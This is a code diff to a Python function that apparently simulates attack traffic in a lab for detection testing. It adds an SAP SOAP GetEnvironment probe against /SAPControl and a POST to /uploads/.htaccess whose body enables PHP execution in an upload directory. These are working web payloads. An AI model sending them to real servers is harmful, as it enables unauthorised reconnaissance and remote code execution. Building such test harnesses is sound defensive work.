@@ -129,6 +129,19 @@ def run_attack_behaviors() -> None:
         ua="python-httpx/0.28.1",
     )
     http_req(
+        "/SAPControl",
+        method="POST",
+        body=b"<SOAP-ENV:Envelope><SOAP-ENV:Body><m:GetEnvironment/></SOAP-ENV:Body></SOAP-ENV:Envelope>",
+        headers={"Content-Type": "text/xml"},
+        ua="python-httpx/0.28.1",
+    )
+    http_req(
+        "/uploads/.htaccess",
+        method="POST",
+        body=b"php_flag engine on\nSetHandler application/x-httpd-php\n",
+        ua="python-httpx/0.28.1",
+    )
+    http_req(
         "/api/v1/status",
         headers={
             "X-ARTX-KEY": "lab-canary",
